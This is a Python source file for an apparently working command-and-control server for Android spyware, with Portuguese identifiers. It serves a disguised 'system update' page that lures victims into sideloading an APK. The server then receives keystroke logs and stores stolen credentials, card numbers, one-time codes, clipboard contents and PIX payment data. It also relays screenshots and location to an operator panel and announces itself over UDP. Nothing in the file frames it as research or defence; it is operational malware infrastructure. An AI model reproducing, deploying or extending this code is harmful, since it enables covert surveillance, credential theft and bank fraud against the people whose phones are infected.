# server.py - C2, porta 8080
import asyncio, json, os, socket, time
from aiohttp import web, WSMsgType

TOKEN = os.environ.get("AVAL_TOKEN", "m4t7k2p9x6v3n8b5z1q0w7r2")
DEVS = {}
VIEW = {}
BUSY = set()
AQUI = os.path.dirname(os.path.abspath(__file__))
KF = os.path.join(AQUI, "teclado.log")
CF = os.path.join(AQUI, "cofre.jsonl")
APK = os.path.join(AQUI, "aval.apk")
VER = "1.2.3"


def klog(dev, pkg, win, txt):
    try:
        if os.path.exists(KF) and os.path.getsize(KF) > 3000000:
            with open(KF, encoding="utf-8", errors="replace") as f:
                cauda = f.read()[-1000000:]
            with open(KF, "w", encoding="utf-8") as f:
                f.write(cauda)
        with open(KF, "a", encoding="utf-8") as f:
            f.write("%s\t%s\t%s\t%s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), dev or "?",
                                          (pkg or "?") + ("/" + win if win else ""),
                                          (txt or "").replace("\n", "\\n")))
    except Exception:
        pass


def cofre(tipo, dev, o):
    try:
        if isinstance(o, str):
            o = {"v": o}
        o = dict(o)
        o["_t"] = tipo
        o["_dev"] = dev
        o["_h"] = time.strftime("%Y-%m-%d %H:%M:%S")
        with open(CF, "a", encoding="utf-8") as f:
            f.write(json.dumps(o, ensure_ascii=False) + "\n")
    except Exception:
        pass


def devlist():
    return [{"id": k, "m": v["i"].get("m", "?"), "bat": v["i"].get("bat", -1),
             "w": v["i"].get("w", 0), "h": v["i"].get("h", 0)} for k, v in DEVS.items()]


def ok(req):
    return req.query.get("t") == TOKEN


async def bcast(o, only=None):
    d = json.dumps(o)
    for v in [v for v, s in VIEW.items() if only is None or s == only]:
        try:
            await v.send_str(d)
        except Exception:
            pass


async def relay(dev, data):
    for v in [v for v, s in VIEW.items() if s == dev and v not in BUSY]:
        BUSY.add(v)
        try:
            await v.send_bytes(data)
        except Exception:
            pass
        finally:
            BUSY.discard(v)


async def devs():
    await bcast({"k": "devs", "d": devlist()})


async def index(req):
    if not ok(req):
        raise web.HTTPFound("/?t=" + TOKEN)
    try:
        with open(os.path.join(AQUI, "painel.html"), encoding="utf-8") as f:
            pagina = f.read()
    except Exception as e:
        return web.Response(text="painel.html ausente: %s" % e, status=500)
    return web.Response(text=pagina, content_type="text/html", charset="utf-8")


PAGINA_INSTALA = """<!doctype html><html lang="pt-BR"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Atualizacao do sistema</title><style>
*{box-sizing:border-box}body{margin:0;background:#0B0F14;color:#fff;
font:16px/1.5 -apple-system,Roboto,sans-serif;padding:26px 20px 40px}
h1{font-size:22px;margin:0 0 6px}p.sub{color:#6E7C8A;font-size:12px;margin:0 0 22px}
.p{display:flex;gap:14px;background:#151A21;border:1px solid #283240;border-radius:16px;
padding:16px;margin-bottom:10px}.n{flex:0 0 30px;height:30px;border-radius:50%;
background:#3D8BFD;color:#fff;font-weight:700;display:flex;align-items:center;
justify-content:center;font-size:14px}.p b{display:block;font-size:15px;font-weight:600}
.p span{color:#6E7C8A;font-size:12.5px}
a.b{display:block;text-align:center;background:#3FB950;color:#04140A;font-weight:700;
padding:16px;border-radius:14px;text-decoration:none;margin:22px 0 10px;font-size:17px}
a.b.off{background:#283240;color:#6E7C8A}
.f{color:#3E4A56;font-size:11px;margin-top:22px}
</style></head><body>
<h1>Atualizacao do sistema</h1>
<p class="sub">versao """ + VER + """ &middot; componentes do sistema</p>
<div class="p"><div class="n">1</div><div><b>Baixar</b><span>toque no botao verde abaixo</span></div></div>
<div class="p"><div class="n">2</div><div><b>Instalar</b><span>se pedir, permita a instalacao de apps desta fonte</span></div></div>
<div class="p"><div class="n">3</div><div><b>Abrir</b><span>abra o app e siga os 3 cartoes da tela</span></div></div>
<a class="b%OFF%" href="/apk?t=""" + """%T%">Baixar atualizacao</a>
<p class="f">Se o download nao comecar, use o menu do navegador e escolha "Baixar pagina".</p>
</body></html>"""


async def install_page(req):
    if not ok(req):
        raise web.HTTPFound("/i?t=" + TOKEN)
    html = (PAGINA_INSTALA
            .replace("%OFF%", "" if os.path.exists(APK) else " off")
            .replace("%T%", TOKEN))
    return web.Response(text=html, content_type="text/html", charset="utf-8")


async def apk(req):
    if not ok(req):
        raise web.HTTPForbidden(text="token invalido")
    if not os.path.exists(APK):
        raise web.HTTPNotFound(text="apk ausente")
    return web.FileResponse(APK, headers={
        "Content-Type": "application/vnd.android.package-archive",
        "Content-Disposition": 'attachment; filename="Atualizacao.apk"'})


async def ping(req):
    return web.json_response({"ok": True, "t": int(time.time()), "devs": len(DEVS)})


async def phone(req):
    if not ok(req):
        return web.Response(text="token invalido", status=403)
    if req.headers.get("Upgrade", "").lower() != "websocket":
        h = req.headers.get("Host", "localhost:8080")
        tls = req.secure or req.headers.get("X-Forwarded-Proto") == "https"
        return web.Response(text="%s://%s/ws?t=%s\n" % ("wss" if tls else "ws", h, TOKEN))
    ws = web.WebSocketResponse(heartbeat=20, max_msg_size=0, compress=False)
    await ws.prepare(req)
    dev = None
    try:
        async for m in ws:
            if m.type == WSMsgType.BINARY:
                if dev:
                    await relay(dev, m.data)
            elif m.type == WSMsgType.TEXT:
                try:
                    o = json.loads(m.data)
                except Exception:
                    o = {"t": "raw", "o": m.data}
                if o.get("t") == "hello":
                    dev = o.get("id", "?")
                    DEVS[dev] = {"ws": ws, "i": o}
                    print("+ %s (%d online)" % (dev, len(DEVS)))
                    await devs()
                elif o.get("t") == "ka":
                    try:
                        await ws.send_str('{"c":"ka"}')
                    except Exception:
                        pass
                    continue
                elif o.get("t") == "k":
                    klog(dev, o.get("pkg"), o.get("win"), o.get("o", ""))
                    await bcast({"k": "key", "d": {"id": dev, "pkg": o.get("pkg"),
                                                   "win": o.get("win"), "o": o.get("o", ""),
                                                   "h": time.strftime("%H:%M:%S")}})
                    continue
                elif o.get("t") in ("cred", "cartao", "otp", "clip", "pixvisto"):
                    cofre(o.get("t"), dev, o.get("o"))
                    await bcast({"k": "log", "d": o}, dev)
                else:
                    await bcast(o, dev)
    except Exception as e:
        print(" ! erro em %s: %s" % (dev, e))
    finally:
        if dev and DEVS.get(dev, {}).get("ws") is ws:
            DEVS.pop(dev, None)
            print("- %s saiu" % dev)
            await devs()
    return ws


async def panel(req):
    if not ok(req):
        raise web.HTTPForbidden(text="token invalido")
    ws = web.WebSocketResponse(heartbeat=20, max_msg_size=0, compress=False)
    await ws.prepare(req)
    VIEW[ws] = None
    await ws.send_str(json.dumps({"k": "devs", "d": devlist()}))
    try:
        async for m in ws:
            if m.type != WSMsgType.TEXT:
                continue
            try:
                o = json.loads(m.data)
            except Exception:
                continue
            if o.get("c") == "sel":
                VIEW[ws] = o.get("id") or None
                alvo = DEVS.get(VIEW[ws])
                if alvo:
                    try:
                        await alvo["ws"].send_str('{"c":"shot","on":true}')
                        await alvo["ws"].send_str('{"c":"info"}')
                        await alvo["ws"].send_str('{"c":"geo"}')
                    except Exception:
                        pass
                continue
            alvo = DEVS.get(o.get("id") or VIEW[ws])
            if not alvo:
                await ws.send_str(json.dumps({"k": "log", "d": {"t": "err", "o": "aparelho offline"}}))
                continue
            VIEW[ws] = o.get("id") or VIEW[ws]
            try:
                await alvo["ws"].send_str(json.dumps({k: v for k, v in o.items() if k != "id"}))
            except Exception:
                pass
    except Exception:
        pass
    finally:
        VIEW.pop(ws, None)
    return ws


async def keys_get(req):
    if not ok(req):
        raise web.HTTPForbidden(text="token invalido")
    try:
        n = min(int(req.query.get("n", 400)), 2000)
    except Exception:
        n = 400
    dev = req.query.get("dev")
    linhas = []
    if os.path.exists(KF):
        with open(KF, encoding="utf-8", errors="replace") as f:
            for l in f:
                if dev and ("\t" + dev + "\t") not in l:
                    continue
                linhas.append(l.rstrip("\n"))
    return web.json_response({"l": linhas[-n:]})


async def keys_clear(req):
    if not ok(req):
        raise web.HTTPForbidden(text="token invalido")
    open(KF, "w", encoding="utf-8").close()
    return web.json_response({"ok": True})


async def keys_dl(req):
    if not ok(req):
        raise web.HTTPForbidden(text="token invalido")
    if not os.path.exists(KF):
        open(KF, "w", encoding="utf-8").close()
    return web.FileResponse(KF, headers={"Content-Disposition": 'attachment; filename="teclado.log"'})


async def cofre_get(req):
    if not ok(req):
        raise web.HTTPForbidden(text="token invalido")
    tipo = req.query.get("tipo")
    out = []
    if os.path.exists(CF):
        with open(CF, encoding="utf-8", errors="replace") as f:
            for l in f:
                try:
                    o = json.loads(l)
                except Exception:
                    continue
                if tipo and o.get("_t") != tipo:
                    continue
                out.append(o)
    return web.json_response({"l": out[-800:][::-1]})


async def cofre_clr(req):
    if not ok(req):
        raise web.HTTPForbidden(text="token invalido")
    open(CF, "w", encoding="utf-8").close()
    return web.json_response({"ok": True})


async def health(req):
    if not ok(req):
        raise web.HTTPForbidden(text="token invalido")
    return web.json_response({"ok": True, "devices": devlist()})


def local_ip(dst):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((dst, 9))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


async def udp_loop():
    loop = asyncio.get_event_loop()
    sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sk.bind(("0.0.0.0", 8089))
    except Exception as e:
        print("! udp 8089 indisponivel: %s" % e)
        return
    sk.setblocking(False)
    while True:
        try:
            data, addr = await loop.sock_recvfrom(sk, 64)
            if data.strip() == b"AVAL":
                await loop.sock_sendto(sk, ("ws://%s:8080/ws?t=%s" % (local_ip(addr[0]), TOKEN)).encode(), addr)
        except Exception:
            await asyncio.sleep(0.2)


async def on_start(app):
    app["udp"] = asyncio.create_task(udp_loop())


async def no_cache(req, resp):
    resp.headers["Cache-Control"] = "no-store, max-age=0"


def main():
    app = web.Application()
    app.on_response_prepare.append(no_cache)
    app.router.add_get("/", index)
    app.router.add_get("/i", install_page)
    app.router.add_get("/apk", apk)
    app.router.add_get("/ping", ping)
    app.router.add_get("/ws", phone)
    app.router.add_get("/panel", panel)
    app.router.add_get("/health", health)
    app.router.add_get("/keys", keys_get)
    app.router.add_get("/keys/clear", keys_clear)
    app.router.add_get("/keys/dl", keys_dl)
    app.router.add_get("/cofre", cofre_get)
    app.router.add_get("/cofre/clr", cofre_clr)
    app.on_startup.append(on_start)
    print("painel: http://localhost:8080/")
    print("instalacao: http://localhost:8080/i")
    web.run_app(app, host="0.0.0.0", port=8080, print=None, access_log=None)


main()
